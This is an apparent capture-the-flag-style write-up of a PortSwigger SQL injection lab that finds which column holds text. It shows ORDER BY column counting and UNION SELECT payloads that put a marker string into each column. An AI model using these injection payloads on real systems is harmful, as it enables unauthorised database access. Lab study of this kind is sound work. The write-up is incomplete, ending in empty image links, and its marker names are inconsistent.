## Lab Description :

![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/94665b713a64ef2e438db55767ed97a91bdfd96d/SQL-Injection/Lab%3A%20SQL%20injection%20UNION%20attack%2C%20finding%20a%20column%20containing%20text/Images/Lab%20Description.png)

## Solution :

Query made - 
```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>'
```

**ORDER BY 4** return an error, means there are 3 columns being queried and retreived by the web application.

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' ORDER BY 4 --
```

![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/900c20736439017c44da2e0965a2abe90959a300/SQL-Injection/Lab%3A%20SQL%20injection%20UNION%20attack%2C%20finding%20a%20column%20containing%20text/Images/ORDER%20BY%204.png)


#### Determine the column containng text data -

![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/b5d64c705aa25e50a9679851ccf4b31e334ca2e1/SQL-Injection/Lab%3A%20SQL%20injection%20UNION%20attack%2C%20finding%20a%20column%20containing%20text/Images/Retrieve%20String.png)


We need to use the UNION SELECT payload  using 3 NULL values. Try thetring value *stydPI* in one NULL value to see if it returns that string. If it does , then it means the column contains string data else it is not sting data.

**33eWHU in 1st NULL -**

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT 'stydPI',NULL,NULL --
```

![image](https://github.com/shantanuumrani1109/PortSwigger-Labs/blob/7f66bfbd0766470932dd6663f3d1c95d123f4387/SQL-Injection/Lab%3A%20SQL%20injection%20UNION%20attack%2C%20finding%20a%20column%20containing%20text/Images/Payload%20in%201st%20NULL%20value.png)

**33eWHU in 2nd NULL -**

```sql
SELECT * FROM someTable WHERE category = '<CATEGORY>' UNION SELECT NULL,'stydPI',NULL
```

![image]()

![image]()

![image]()


